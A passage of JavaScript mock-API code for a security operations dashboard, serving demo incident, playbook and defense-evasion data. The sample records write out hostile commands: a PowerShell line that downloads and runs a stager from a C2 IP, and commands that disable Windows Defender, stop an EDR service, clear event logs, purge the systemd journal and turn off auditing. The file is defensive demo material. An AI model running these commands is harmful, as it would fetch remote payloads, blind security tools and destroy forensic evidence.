  if (/^\/pb\/executions\/\d+$/.test(p)) return ok({ id: 1, execution_id: 'EX-2026-000001', status: 'success', trigger_type: 'alert_critical', analyst: 'j.smith', started_at: new Date(Date.now() - 3600000).toISOString(), ended_at: new Date(Date.now() - 3510000).toISOString(), duration_s: 91, failed_step: '', step_log: '[]', is_dry_run: false });
  if (p === '/pb/approvals')    return ok([{ id: 1, execution_id: 'EX-2026-000005', playbook_name: 'Ransomware Response', action: 'Isolate Endpoint — WS-ANALYST-01', policy: 'dual_approval', status: 'pending', requestor: 'm.kumar', approver: '', notes: '', created_at: new Date(Date.now() - 28000).toISOString() }, { id: 2, execution_id: 'EX-2026-000007', playbook_name: 'Insider Threat Response', action: 'Disable User Account — CORP\\jdoe', policy: 'manager_approval', status: 'pending', requestor: 'a.chen', approver: '', notes: '', created_at: new Date(Date.now() - 120000).toISOString() }, { id: 3, execution_id: 'EX-2026-000008', playbook_name: 'Cloud IAM Response', action: 'Revoke AWS IAM credentials — prod-deploy-key', policy: 'security_approval', status: 'pending', requestor: 'j.smith', approver: '', notes: '', created_at: new Date(Date.now() - 600000).toISOString() }, { id: 4, execution_id: 'EX-2026-000003', playbook_name: 'IOC Block Automation', action: 'Block IP — 185.220.101.47', policy: 'automatic', status: 'approved', requestor: 'system', approver: 'j.smith', notes: 'Confirmed Cobalt Strike C2 — approved', created_at: new Date(Date.now() - 7200000).toISOString() }]);
  if (p === '/pb/schedules')    return ok([{ id: 1, playbook_id: 3, playbook_name: 'IOC Block Automation', schedule_type: 'hourly', cron_expr: '0 * * * *', enabled: true, last_run: new Date(Date.now() - 3600000).toISOString(), next_run: new Date(Date.now() + 3600000).toISOString() }, { id: 2, playbook_id: 1, playbook_name: 'Ransomware Response', schedule_type: 'manual', cron_expr: '', enabled: false, last_run: null, next_run: null }, { id: 3, playbook_id: 2, playbook_name: 'Phishing Response', schedule_type: 'daily', cron_expr: '0 6 * * *', enabled: true, last_run: new Date(Date.now() - 86400000).toISOString(), next_run: new Date(Date.now() + 43200000).toISOString() }]);
  if (p === '/pb/integrations') return ok([{ category: 'Security', integrations: [{ id: 'active_directory', name: 'Active Directory', status: 'connected', icon: '🏛' }, { id: 'entra_id', name: 'Entra ID', status: 'connected', icon: '🔷' }, { id: 'firewall', name: 'Firewall', status: 'connected', icon: '🔥' }, { id: 'edr', name: 'EDR (CrowdStrike)', status: 'connected', icon: '🦅' }, { id: 'siem', name: 'SIEM', status: 'connected', icon: '📊' }, { id: 'threat_intel', name: 'Threat Intelligence', status: 'connected', icon: '🕵' }, { id: 'email_security', name: 'Email Security', status: 'connected', icon: '📧' }] }, { category: 'Collaboration', integrations: [{ id: 'slack', name: 'Slack', status: 'connected', icon: '💬' }, { id: 'teams', name: 'Microsoft Teams', status: 'disconnected', icon: '💼' }, { id: 'jira', name: 'Jira', status: 'connected', icon: '🎫' }, { id: 'servicenow', name: 'ServiceNow', status: 'connected', icon: '🎟' }, { id: 'pagerduty', name: 'PagerDuty', status: 'connected', icon: '📟' }] }, { category: 'Cloud', integrations: [{ id: 'aws', name: 'AWS', status: 'connected', icon: '☁' }, { id: 'azure', name: 'Azure', status: 'connected', icon: '🔷' }, { id: 'gcp', name: 'GCP', status: 'disconnected', icon: '🌐' }] }, { category: 'Infrastructure', integrations: [{ id: 'ssh', name: 'SSH', status: 'connected', icon: '🖥' }, { id: 'rest_api', name: 'REST API', status: 'connected', icon: '🔌' }, { id: 'webhooks', name: 'Webhooks', status: 'connected', icon: '🪝' }] }]);
  if (p === '/pb/templates')    return ok([{ id: 'ransomware', name: 'Ransomware Response', icon: '🔐', category: 'incident_response', description: 'Automated ransomware containment — block C2, isolate endpoints, preserve evidence', trigger: 'alert_critical', node_count: 12, estimated_time_s: 90, approval_policy: 'dual_approval', tags: 'ransomware,critical,containment' }, { id: 'phishing', name: 'Phishing Response', icon: '🎣', category: 'email_security', description: 'Phishing email triage — pull headers, sandbox URL, block sender, notify users', trigger: 'alert_high', node_count: 9, estimated_time_s: 45, approval_policy: 'automatic', tags: 'phishing,email,awareness' }, { id: 'malware', name: 'Malware Response', icon: '🦠', category: 'endpoint', description: 'Malware detection → file quarantine, process kill, memory dump, threat intel lookup', trigger: 'ioc_match', node_count: 10, estimated_time_s: 60, approval_policy: 'manager_approval', tags: 'malware,edr,endpoint' }, { id: 'insider_threat', name: 'Insider Threat', icon: '👤', category: 'ueba', description: 'Insider risk — disable account, HR notification, legal hold, preserve audit logs', trigger: 'alert_high', node_count: 8, estimated_time_s: 30, approval_policy: 'dual_approval', tags: 'insider,hr,compliance' }, { id: 'password_spray', name: 'Password Spray', icon: '🔑', category: 'identity', description: 'Password spray detection → lock account, force MFA, alert AD team, threat hunt', trigger: 'alert_medium', node_count: 7, estimated_time_s: 20, approval_policy: 'automatic', tags: 'identity,ad,brute-force' }, { id: 'cloud_incident', name: 'Cloud Incident', icon: '☁', category: 'cloud', description: 'Cloud compromise → revoke credentials, snapshot instance, CloudTrail analysis, alert', trigger: 'alert_critical', node_count: 11, estimated_time_s: 75, approval_policy: 'security_approval', tags: 'cloud,aws,azure' }, { id: 'data_exfil', name: 'Data Exfiltration', icon: '📤', category: 'dlp', description: 'Data exfil detection → block egress, notify DLP team, legal hold, exec notification', trigger: 'alert_critical', node_count: 10, estimated_time_s: 40, approval_policy: 'dual_approval', tags: 'dlp,compliance,legal' }, { id: 'web_shell', name: 'Web Shell Detection', icon: '🐚', category: 'web_security', description: 'Web shell → collect IOCs, block process, snapshot server, notify DevOps', trigger: 'alert_high', node_count: 8, estimated_time_s: 35, approval_policy: 'automatic', tags: 'webshell,server,deface' }]);
  if (p === '/pb/marketplace')  return ok([{ id: 'crowdstrike-falcon', name: 'CrowdStrike Falcon', vendor: 'CrowdStrike', icon: '🦅', category: 'edr', description: 'Full RTR response automation — isolate, collect, remediate directly via Falcon API', downloads: 8421, rating: 4.9, tags: ['edr', 'endpoint', 'falcon'], actions: ['isolate_host', 'collect_file', 'run_rtr', 'quarantine'] }, { id: 'microsoft-defender', name: 'Microsoft Defender', vendor: 'Microsoft', icon: '🛡', category: 'edr', description: 'Defender for Endpoint automation — isolate, investigate, hunt, remediate', downloads: 6102, rating: 4.7, tags: ['edr', 'microsoft', 'defender'], actions: ['isolate', 'collect_investigation', 'run_av_scan', 'live_response'] }, { id: 'active-directory', name: 'Active Directory', vendor: 'Microsoft', icon: '🏛', category: 'identity', description: 'AD automation — disable accounts, reset passwords, move OUs, audit groups', downloads: 5543, rating: 4.8, tags: ['ad', 'identity', 'ldap'], actions: ['disable_user', 'reset_password', 'move_ou', 'audit_groups'] }, { id: 'aws-security', name: 'AWS Security', vendor: 'Amazon', icon: '☁', category: 'cloud', description: 'AWS automation — revoke keys, snapshot EC2, quarantine SG, WAF rules', downloads: 4219, rating: 4.6, tags: ['aws', 'cloud', 'iam'], actions: ['revoke_keys', 'snapshot_ec2', 'modify_sg', 'waf_rule'] }, { id: 'jira-tickets', name: 'Jira Integration', vendor: 'Atlassian', icon: '🎫', category: 'ticketing', description: 'Auto-create Jira tickets with full incident context, links, and SLA tracking', downloads: 7893, rating: 4.5, tags: ['jira', 'ticketing', 'atlassian'], actions: ['create_ticket', 'update_ticket', 'add_comment', 'transition_status'] }, { id: 'slack-notify', name: 'Slack Notifications', vendor: 'Slack', icon: '💬', category: 'collaboration', description: 'Rich Slack notifications with incident details, action buttons, and approvals', downloads: 9134, rating: 4.9, tags: ['slack', 'notify', 'collaboration'], actions: ['send_message', 'create_channel', 'post_alert', 'request_approval'] }, { id: 'pagerduty', name: 'PagerDuty', vendor: 'PagerDuty', icon: '📟', category: 'alerting', description: 'PagerDuty incident creation, escalation policies, and on-call management', downloads: 3876, rating: 4.7, tags: ['pagerduty', 'oncall', 'escalation'], actions: ['create_incident', 'escalate', 'resolve', 'add_responder'] }, { id: 'generic-rest', name: 'Generic REST API', vendor: 'XCloak', icon: '🔌', category: 'integration', description: 'Universal REST action — call any HTTP API with auth, headers, body templating', downloads: 11205, rating: 4.6, tags: ['rest', 'api', 'universal'], actions: ['http_get', 'http_post', 'http_put', 'http_delete'] }]);

  // ── Cases Enterprise ──────────────────────────────────────────────────────
  if (p === '/cases/dashboard')   return ok({ open: 5, in_progress: 4, waiting_approval: 2, escalated: 1, closed: 24, sla_breach: 1, sla_warning: 2, avg_resolution_h: 18, analyst_workload: [{ analyst: 'j.smith', open: 3, in_progress: 2, closed: 8 }, { analyst: 'a.chen', open: 2, in_progress: 3, closed: 5 }, { analyst: 'm.kumar', open: 1, in_progress: 1, closed: 11 }] });
  if (p === '/cases/analytics')   return ok({ case_trend: [{ date: '2026-07-09', count: 0 }, { date: '2026-07-10', count: 1 }, { date: '2026-07-11', count: 2 }, { date: '2026-07-12', count: 1 }, { date: '2026-07-13', count: 2 }, { date: '2026-07-14', count: 3 }, { date: '2026-07-15', count: 2 }, { date: '2026-07-16', count: 5 }], by_severity: [{ severity: 'critical', count: 4 }, { severity: 'high', count: 7 }, { severity: 'medium', count: 5 }, { severity: 'low', count: 2 }], by_analyst: [{ analyst: 'j.smith', count: 13 }, { analyst: 'a.chen', count: 10 }, { analyst: 'm.kumar', count: 13 }], avg_resolution_hours: [{ severity: 'critical', hours: 6 }, { severity: 'high', hours: 12 }, { severity: 'medium', hours: 24 }, { severity: 'low', hours: 48 }], sla_compliance: 78, recurring_case_count: 3 });
  if (p === '/cases/templates')   return ok([{ id: 'malware', name: 'Malware Investigation', icon: '🦠', description: 'Malware triage, memory forensics, IOC extraction', tasks: ['Collect memory dump', 'Run YARA scan', 'Extract IOCs', 'Check threat intel', 'Isolate endpoint', 'Notify IT'] }, { id: 'phishing', name: 'Phishing Investigation', icon: '🎣', description: 'Email phishing analysis and user impact assessment', tasks: ['Collect phishing email headers', 'Extract URLs and attachments', 'Analyse payload', 'Identify impacted users', 'Block sender and URLs', 'Notify affected users'] }, { id: 'ransomware', name: 'Ransomware Response', icon: '🔐', description: 'Ransomware containment, recovery, and forensics', tasks: ['Isolate affected hosts', 'Identify patient zero', 'Preserve forensic images', 'Check backups', 'Assess blast radius', 'Initiate recovery', 'Legal notification'] }, { id: 'insider_threat', name: 'Insider Threat', icon: '👤', description: 'Insider threat investigation with HR/Legal involvement', tasks: ['Preserve user activity logs', 'HR notification', 'Legal hold', 'Interview manager', 'Collect DLP data', 'Document findings'] }, { id: 'cloud_incident', name: 'Cloud Incident', icon: '☁', description: 'Cloud environment compromise investigation', tasks: ['Identify compromised credentials', 'Audit CloudTrail/Activity Logs', 'Check IAM changes', 'Assess data exposure', 'Rotate credentials', 'Harden posture'] }, { id: 'ad_attack', name: 'AD Attack', icon: '🏛', description: 'Active Directory compromise response', tasks: ['Identify compromised accounts', 'Check for Golden Ticket', 'Audit domain admin membership', 'Reset KRBTGT', 'Force password resets', 'Review ACLs'] }, { id: 'data_exfil', name: 'Data Exfiltration', icon: '📤', description: 'Data exfiltration detection and containment', tasks: ['Identify exfil channel', 'Quantify data volume', 'Preserve network logs', 'Block destination', 'Legal/compliance notification', 'PR preparation'] }]);
  if (p === '/cases')             return ok([{ id: 1, case_id: 'CASE-2026-0001', title: 'Cobalt Strike Beacon — WS-ANALYST-01', description: 'Confirmed Cobalt Strike beacon via Process Hollowing after AMSI bypass and Defender disable. C2 communication detected to 185.220.101.47. LSASS access on DC-01.', severity: 'critical', priority: 'critical', status: 'in_progress', owner: 'j.smith', team: 'SOC Tier 3', due_date: new Date(Date.now() + 3600000 * 6).toISOString(), sla_status: 'warning', tags: 'cobalt-strike,process-injection,amsi-bypass', template: 'malware', created_at: new Date(Date.now() - 3800000).toISOString(), updated_at: new Date(Date.now() - 1800000).toISOString() }, { id: 2, case_id: 'CASE-2026-0002', title: 'Phishing Campaign — Finance Team', description: 'Targeted phishing emails with malicious DOCX attachments sent to 14 finance team members. 3 users opened the attachment. Payload analysis pending.', severity: 'high', priority: 'high', status: 'open', owner: 'a.chen', team: 'SOC Tier 2', due_date: new Date(Date.now() + 3600000 * 24).toISOString(), sla_status: 'ok', tags: 'phishing,finance,docx-macro', template: 'phishing', created_at: new Date(Date.now() - 7200000).toISOString(), updated_at: new Date(Date.now() - 3600000).toISOString() }, { id: 3, case_id: 'CASE-2026-0003', title: 'Ransomware Pre-Stage Indicators — DC-01', description: 'Shadow copy deletion and VSS service stop detected on DC-01 after credential theft. Ransomware deployment suspected but not yet confirmed.', severity: 'critical', priority: 'critical', status: 'escalated', owner: 'j.smith', team: 'DFIR', due_date: new Date(Date.now() + 3600000 * 2).toISOString(), sla_status: 'breach', tags: 'ransomware,pre-stage,dc', template: 'ransomware', created_at: new Date(Date.now() - 1800000).toISOString(), updated_at: new Date(Date.now() - 600000).toISOString() }, { id: 4, case_id: 'CASE-2026-0004', title: 'Insider Threat — Unusual Data Export', description: 'Employee exported 2.3 GB of customer PII to personal OneDrive before submitting resignation letter. DLP alert triggered.', severity: 'high', priority: 'high', status: 'waiting_approval', owner: 'm.kumar', team: 'SOC Tier 2', due_date: new Date(Date.now() + 3600000 * 48).toISOString(), sla_status: 'ok', tags: 'insider-threat,data-exfil,dlp', template: 'insider_threat', created_at: new Date(Date.now() - 86400000).toISOString(), updated_at: new Date(Date.now() - 7200000).toISOString() }, { id: 5, case_id: 'CASE-2026-0005', title: 'Cloud IAM Privilege Escalation — AWS', description: 'Compromised IAM user escalated privileges to AdministratorAccess policy. S3 bucket listing and EC2 enumeration detected.', severity: 'high', priority: 'high', status: 'open', owner: 'a.chen', team: 'Cloud Security', due_date: new Date(Date.now() + 3600000 * 12).toISOString(), sla_status: 'ok', tags: 'cloud,aws,iam,privilege-escalation', template: 'cloud_incident', created_at: new Date(Date.now() - 3600000).toISOString(), updated_at: new Date(Date.now() - 1800000).toISOString() }]);
  if (/^\/cases\/\d+$/.test(p) && method === 'GET') return ok({ id: 1, case_id: 'CASE-2026-0001', title: 'Cobalt Strike Beacon — WS-ANALYST-01', description: 'Confirmed Cobalt Strike beacon via Process Hollowing after AMSI bypass and Defender disable. C2 communication detected to 185.220.101.47. LSASS access on DC-01. Two hosts affected.', severity: 'critical', priority: 'critical', status: 'in_progress', owner: 'j.smith', team: 'SOC Tier 3', due_date: new Date(Date.now() + 3600000 * 6).toISOString(), sla_status: 'warning', tags: 'cobalt-strike,process-injection,amsi-bypass', linked_incidents: 'INC-2026-0714-001,INC-2026-0714-002', linked_alerts: 'ALT-0001,ALT-0002,ALT-0003', template: 'malware', created_at: new Date(Date.now() - 3800000).toISOString(), updated_at: new Date(Date.now() - 1800000).toISOString() });
  if (/^\/cases\/\d+\/tasks$/.test(p) && method === 'GET') return ok([{ id: 1, title: 'Collect memory dump from WS-ANALYST-01', status: 'done', priority: 'critical', assignee: 'j.smith', due_date: new Date(Date.now() - 3000000).toISOString(), checklist: '["Verify winpmem on endpoint","Run winpmem.exe","Transfer to secure storage","Verify hash"]', notes: 'Memory dump collected at 09:24 UTC. SHA256: a1b2c3d4...', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, title: 'Review PowerShell event logs (Event 4104)', status: 'done', priority: 'high', assignee: 'j.smith', due_date: new Date(Date.now() - 2400000).toISOString(), checklist: '["Export EVTX","Parse with PowerShell Module Logging","Extract encoded commands","Decode with CyberChef"]', notes: 'Found -enc SQBFAF... — decoded to Cobalt Strike stager', created_at: new Date(Date.now() - 3500000).toISOString() }, { id: 3, title: 'Block IOC — 185.220.101.47', status: 'done', priority: 'critical', assignee: 'a.chen', due_date: new Date(Date.now() - 2000000).toISOString(), checklist: '["Add to firewall deny list","Add to proxy blocklist","Check existing connections","Monitor for alternative C2"]', notes: 'Blocked at perimeter firewall at 09:45 UTC', created_at: new Date(Date.now() - 3400000).toISOString() }, { id: 4, title: 'Isolate WS-ANALYST-01', status: 'done', priority: 'critical', assignee: 'j.smith', due_date: new Date(Date.now() - 1800000).toISOString(), checklist: '["Confirm via EDR","Initiate network isolation","Verify isolation","Document timestamp"]', notes: 'Isolated via CrowdStrike Falcon at 09:50 UTC', created_at: new Date(Date.now() - 3300000).toISOString() }, { id: 5, title: 'Reset domain admin credentials', status: 'in_progress', priority: 'critical', assignee: 'm.kumar', due_date: new Date(Date.now() + 3600000).toISOString(), checklist: '["Identify all DA accounts","Coordinate with IT","Force password reset","Invalidate existing sessions","Reset KRBTGT x2"]', notes: '', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 6, title: 'Notify IT Security Manager', status: 'pending', priority: 'medium', assignee: 'j.smith', due_date: new Date(Date.now() + 7200000).toISOString(), checklist: '["Draft notification","Get approval from CISO","Send via secure channel"]', notes: '', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 7, title: 'Scan remaining endpoints for Cobalt Strike IOCs', status: 'pending', priority: 'high', assignee: 'a.chen', due_date: new Date(Date.now() + 14400000).toISOString(), checklist: '["Deploy YARA rules","Run memory scan","Check for beacon IOCs","Report affected hosts"]', notes: '', created_at: new Date(Date.now() - 1200000).toISOString() }]);
  if (/^\/cases\/\d+\/evidence$/.test(p) && method === 'GET') return ok([{ id: 1, evidence_id: 'EVD-0001', title: 'Memory dump — WS-ANALYST-01', evidence_type: 'memory_dump', file_hash: 'sha256:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', collector: 'j.smith', current_owner: 'j.smith', verified: true, custody_chain: '[{"from":"j.smith","to":"j.smith","timestamp":"' + new Date(Date.now()-3600000).toISOString() + '","action":"collected"}]', notes: 'Collected via winpmem 09:24 UTC. 16 GB dump.', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, evidence_id: 'EVD-0002', title: 'PowerShell Event Log — WS-ANALYST-01 (EVTX)', evidence_type: 'log', file_hash: 'sha256:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3', collector: 'j.smith', current_owner: 'j.smith', verified: true, custody_chain: '[{"from":"j.smith","to":"j.smith","timestamp":"' + new Date(Date.now()-3200000).toISOString() + '","action":"collected"}]', notes: 'Microsoft-Windows-PowerShell/Operational EVTX. Module logging enabled.', created_at: new Date(Date.now() - 3200000).toISOString() }, { id: 3, evidence_id: 'EVD-0003', title: 'Network PCAP — WS-ANALYST-01 (09:10–10:00 UTC)', evidence_type: 'pcap', file_hash: 'sha256:c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', collector: 'a.chen', current_owner: 'a.chen', verified: false, custody_chain: '[{"from":"a.chen","to":"a.chen","timestamp":"' + new Date(Date.now()-2800000).toISOString() + '","action":"collected"}]', notes: 'Captured from TAP at switch. Contains C2 traffic to 185.220.101.47.', created_at: new Date(Date.now() - 2800000).toISOString() }, { id: 4, evidence_id: 'EVD-0004', title: 'Malicious DOCX — Q4_Report.docx', evidence_type: 'file', file_hash: 'sha256:3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f', collector: 'j.smith', current_owner: 'j.smith', verified: true, custody_chain: '[{"from":"j.smith","to":"j.smith","timestamp":"' + new Date(Date.now()-3700000).toISOString() + '","action":"collected"}]', notes: 'Retrieved from j.smith Downloads folder. VT: 41/70. Cobalt Strike stager confirmed.', created_at: new Date(Date.now() - 3700000).toISOString() }, { id: 5, evidence_id: 'EVD-0005', title: 'Registry Export — HKLM Software Policies', evidence_type: 'registry', file_hash: 'sha256:d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5', collector: 'm.kumar', current_owner: 'm.kumar', verified: true, custody_chain: '[{"from":"m.kumar","to":"m.kumar","timestamp":"' + new Date(Date.now()-2400000).toISOString() + '","action":"collected"}]', notes: 'Shows DisableAntiSpyware = 1 under Windows Defender policy key.', created_at: new Date(Date.now() - 2400000).toISOString() }]);
  if (/^\/cases\/\d+\/notes$/.test(p) && method === 'GET') return ok([{ id: 1, content: '## Initial Triage\n\n**09:10 UTC** — Alert triggered for WINWORD.EXE spawning PowerShell with `-nop -enc` flags on WS-ANALYST-01.\n\n### Decoded Payload\n```\nIEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.47/a\')\n```\n\nThis is a **Cobalt Strike stager**. The decoded base64 is a classic HTTP stager downloading stage-2 beacon.\n\n### IOCs Extracted\n- `185.220.101.47` — C2 IP (confirmed Cobalt Strike Team Server)\n- `3e4f5a6b...` — SHA256 of malicious DOCX\n- `update.microsoft-cdn[.]net` — C2 redirect domain\n\n### Next: Memory Analysis\nPrioritize explorer.exe PID 4512 — suspected hollow.', author: 'j.smith', note_type: 'markdown', created_at: new Date(Date.now() - 3200000).toISOString() }, { id: 2, content: '## Memory Analysis Results\n\n**Tools used:** Volatility 3, CAPE sandbox\n\n### Findings\n- `explorer.exe` PID 4512: PE header at `0x0000022000000000` — **confirmed Process Hollowing**\n- Entropy: 7.82 — packed/encrypted payload\n- Cobalt Strike config extracted:\n  - Beacon type: HTTPS\n  - C2 server: 185.220.101.47:443\n  - Sleep time: 60s\n  - Jitter: 10%\n  - Malleable C2 profile: jquery-3.3.1.js\n\n### Action Required\n- Block 185.220.101.47 at perimeter ✅\n- Scan other endpoints for same beacon config', author: 'j.smith', note_type: 'markdown', created_at: new Date(Date.now() - 2400000).toISOString() }]);
  if (/^\/cases\/\d+\/timeline$/.test(p) && method === 'GET') return ok([{ id: 1, event: 'Case Created', actor: 'system', event_type: 'case_created', created_at: new Date(Date.now() - 3800000).toISOString() }, { id: 2, event: 'Assigned to j.smith (SOC Tier 3)', actor: 'a.chen', event_type: 'assigned', created_at: new Date(Date.now() - 3700000).toISOString() }, { id: 3, event: 'Evidence collected: Memory dump from WS-ANALYST-01 (EVD-0001)', actor: 'j.smith', event_type: 'evidence_added', created_at: new Date(Date.now() - 3300000).toISOString() }, { id: 4, event: 'IOC Found: Cobalt Strike beacon config extracted — C2 185.220.101.47:443', actor: 'j.smith', event_type: 'ioc_found', created_at: new Date(Date.now() - 2800000).toISOString() }, { id: 5, event: 'IOC Blocked: 185.220.101.47 added to perimeter firewall deny list', actor: 'a.chen', event_type: 'response_action', created_at: new Date(Date.now() - 2600000).toISOString() }, { id: 6, event: 'Host Isolated: WS-ANALYST-01 network isolation via CrowdStrike Falcon', actor: 'j.smith', event_type: 'response_action', created_at: new Date(Date.now() - 2200000).toISOString() }, { id: 7, event: 'LSASS Access detected on DC-01 — case escalated to DFIR', actor: 'system', event_type: 'escalated', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 8, event: 'Approval requested: Forensic image of DC-01 — awaiting manager approval', actor: 'j.smith', event_type: 'approval_requested', created_at: new Date(Date.now() - 1200000).toISOString() }]);
  if (/^\/cases\/\d+\/comments$/.test(p) && method === 'GET') return ok([{ id: 1, content: 'Initial triage complete. This is a confirmed Cobalt Strike infection. Recommend immediate escalation to Tier 3 and DFIR engagement.', author: 'a.chen', is_internal: true, created_at: new Date(Date.now() - 3500000).toISOString() }, { id: 2, content: 'Escalated to j.smith. Memory dump in progress. Will update when we have beacon config.', author: 'j.smith', is_internal: true, created_at: new Date(Date.now() - 3200000).toISOString() }, { id: 3, content: 'Memory analysis complete. Cobalt Strike config extracted: C2 185.220.101.47:443, malleable C2 jquery-3.3.1.js profile. IOC blocking requested from network team.', author: 'j.smith', is_internal: true, created_at: new Date(Date.now() - 2500000).toISOString() }, { id: 4, content: 'IOC blocked at perimeter. Also detected LSASS access from powershell.exe on DC-01 — suspect credential theft. Requesting forensic image approval from CISO.', author: 'a.chen', is_internal: true, created_at: new Date(Date.now() - 1800000).toISOString() }]);

  // ── Defense Evasion Enterprise ────────────────────────────────────────────
  if (p === '/de/dashboard')      return ok({ defense_evasion_alerts: 9, active_evasion_attempts: 7, disabled_security_controls: 2, tamper_events: 4, amsi_bypass_attempts: 3, high_risk_hosts: 4, mitre_coverage: 72, top_categories: ['Security Control Tampering', 'Log Evasion', 'Process Evasion', 'Script Evasion', 'Credential Protection Bypass', 'Network Evasion'] });
  if (p === '/de/controls')       return ok({ controls: [{ id: 1, hostname: 'WS-ANALYST-01', control_name: 'Windows Defender', control_type: 'antivirus', status: 'degraded', last_check: new Date(Date.now() - 900000).toISOString(), version: '4.18.2301', tampered: true, created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 2, hostname: 'WS-ANALYST-01', control_name: 'CrowdStrike Falcon', control_type: 'edr', status: 'active', last_check: new Date(Date.now() - 60000).toISOString(), version: '6.51.14404', tampered: false, created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 3, hostname: 'DC-01', control_name: 'Windows Defender', control_type: 'antivirus', status: 'disabled', last_check: new Date(Date.now() - 3600000).toISOString(), version: '4.18.2301', tampered: true, created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 4, hostname: 'WS-ANALYST-01', control_name: 'Windows Firewall', control_type: 'firewall', status: 'active', last_check: new Date(Date.now() - 120000).toISOString(), version: 'built-in', tampered: false, created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 5, hostname: 'WS-ANALYST-01', control_name: 'Sysmon', control_type: 'audit_logging', status: 'active', last_check: new Date(Date.now() - 30000).toISOString(), version: '15.0', tampered: false, created_at: new Date(Date.now() - 86400000 * 7).toISOString() }, { id: 6, hostname: 'WS-ANALYST-01', control_name: 'Windows Audit Logging', control_type: 'audit_logging', status: 'degraded', last_check: new Date(Date.now() - 1800000).toISOString(), version: 'built-in', tampered: true, created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 7, hostname: 'LINUX-SRV-01', control_name: 'SELinux', control_type: 'mac', status: 'active', last_check: new Date(Date.now() - 300000).toISOString(), version: '3.5', tampered: false, created_at: new Date(Date.now() - 86400000 * 30).toISOString() }, { id: 8, hostname: 'LINUX-SRV-01', control_name: 'auditd', control_type: 'audit_logging', status: 'active', last_check: new Date(Date.now() - 60000).toISOString(), version: '3.0.9', tampered: false, created_at: new Date(Date.now() - 86400000 * 30).toISOString() }], active: 5, degraded: 2, disabled: 1 });
  if (p === '/de/tamper')         return ok({ events: [{ id: 1, hostname: 'WS-ANALYST-01', target: 'Windows Defender Real-Time Protection', action: 'Set-MpPreference -DisableRealtimeMonitoring $true', actor_pid: 7142, actor_name: 'powershell.exe', severity: 'critical', mitre_id: 'T1562.001', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, hostname: 'DC-01', target: 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware', action: 'Registry key set to 1', actor_pid: 4512, actor_name: 'reg.exe', severity: 'critical', mitre_id: 'T1112', status: 'open', created_at: new Date(Date.now() - 2700000).toISOString() }, { id: 3, hostname: 'WS-ANALYST-01', target: 'Security Event Log', action: 'wevtutil.exe cl Security', actor_pid: 8832, actor_name: 'wevtutil.exe', severity: 'critical', mitre_id: 'T1070.001', status: 'open', created_at: new Date(Date.now() - 2400000).toISOString() }, { id: 4, hostname: 'WS-ANALYST-01', target: 'System Event Log', action: 'wevtutil.exe cl System', actor_pid: 8832, actor_name: 'wevtutil.exe', severity: 'critical', mitre_id: 'T1070.001', status: 'open', created_at: new Date(Date.now() - 2380000).toISOString() }, { id: 5, hostname: 'WS-DEV-03', target: 'EDR Service (CSFalconService)', action: 'sc stop CSFalconService', actor_pid: 2142, actor_name: 'cmd.exe', severity: 'critical', mitre_id: 'T1562.001', status: 'resolved', created_at: new Date(Date.now() - 86400000).toISOString() }], total: 5 });
  if (p === '/de/log-evasion')    return ok([{ id: 1, hostname: 'WS-ANALYST-01', technique: 'Event Log Clearing', mitre_id: 'T1070.001', severity: 'critical', status: 'open', description: 'Security and System event logs cleared via wevtutil.exe', process_name: 'wevtutil.exe', cmdline: 'wevtutil.exe cl Security', user_name: 'CORP\\jsmith', created_at: new Date(Date.now() - 2400000).toISOString() }, { id: 2, hostname: 'LINUX-SRV-01', technique: 'Journal Deletion', mitre_id: 'T1070', severity: 'high', status: 'open', description: 'journalctl --rotate && journalctl --vacuum-time=1s executed to destroy systemd journal logs', process_name: 'bash', cmdline: 'journalctl --rotate && journalctl --vacuum-time=1s', user_name: 'root', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 3, hostname: 'WS-ANALYST-01', technique: 'Audit Policy Change', mitre_id: 'T1562.002', severity: 'high', status: 'open', description: 'auditpol.exe used to disable process creation auditing', process_name: 'auditpol.exe', cmdline: 'auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable', user_name: 'CORP\\jsmith', created_at: new Date(Date.now() - 1200000).toISOString() }]);
  if (p === '/de/evasion-events') return ok([{ id: 1, hostname: 'WS-ANALYST-01', category: 'script_evasion', technique: 'AMSI Bypass', mitre_id: 'T1562.001', severity: 'critical', status: 'open', description: 'PowerShell patched AMSI.dll AmsiScanBuffer to return AMSI_RESULT_CLEAN via reflection', process_name: 'powershell.exe', cmdline: 'powershell.exe -nop -enc SQBFAF...', user_name: 'CORP\\jsmith', created_at: new Date(Date.now() - 3800000).toISOString() }, { id: 2, hostname: 'WS-ANALYST-01', category: 'script_evasion', technique: 'PowerShell Obfuscation', mitre_id: 'T1027.010', severity: 'high', status: 'open', description: 'Heavily obfuscated PowerShell with -enc flag — payload decodes to Cobalt Strike stager', process_name: 'powershell.exe', cmdline: 'powershell.exe -NoProfile -NonInteractive -Enc SQBF...', user_name: 'CORP\\jsmith', created_at: new Date(Date.now() - 3700000).toISOString() }, { id: 3, hostname: 'WS-DEV-03', category: 'process_evasion', technique: 'Process Hollowing', mitre_id: 'T1055.012', severity: 'critical', status: 'open', description: 'svchost.exe image unmapped and replaced with Cobalt Strike PE', process_name: 'svchost.exe', cmdline: 'C:\\Windows\\System32\\svchost.exe', user_name: 'NT 